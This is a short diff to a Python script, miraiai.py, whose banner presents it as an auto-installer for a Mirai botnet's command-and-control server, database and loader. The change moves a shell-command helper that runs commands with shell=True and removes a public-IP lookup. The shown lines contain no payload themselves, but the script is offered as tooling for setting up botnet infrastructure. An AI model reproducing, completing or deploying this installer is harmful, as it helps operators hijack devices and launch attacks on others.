@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# Execute command - python miraiai.py <120.0.0.1>
+# Execute command - python miraiai.py
 import subprocess,os,sys,random,time,urllib2,subprocess
 
 ''' 
@@ -41,17 +41,16 @@ Title / Introduction
 ━━━━━━━━━━━━━━━━━━━━
 '''
 
+def run(cmd):                                                  
+    subprocess.call(cmd, shell=True)
+
+    
 print("\x1b[1m\x1b[93m⚠⚠⚠ \x1b[31mREAD \x1b[37m>\x1b[31m> \x1b[37mTHIS ISNT A FULL SETUP YOU STILL HAVE TO EDIT YOUR CONFIGS \x1b[93m⚠⚠⚠\x1b[0m")
 time.sleep(5)
 print("            \x1b[97mMirai Auto-Installer CNC, Database, Loader! \x1b[0m")
 time.sleep(4)
 print("                 \x1b[36mUpdating & Upgrading system \x1b[0m")
 time.sleep(4)
-
-def run(cmd):                                                  
-    subprocess.call(cmd, shell=True)
-
-ip = os.popen("curl -s http://checkip.dyndns.org/").read()
 
 '''
 ━━━━━━━━━━━━━━━━━━━━━━━━
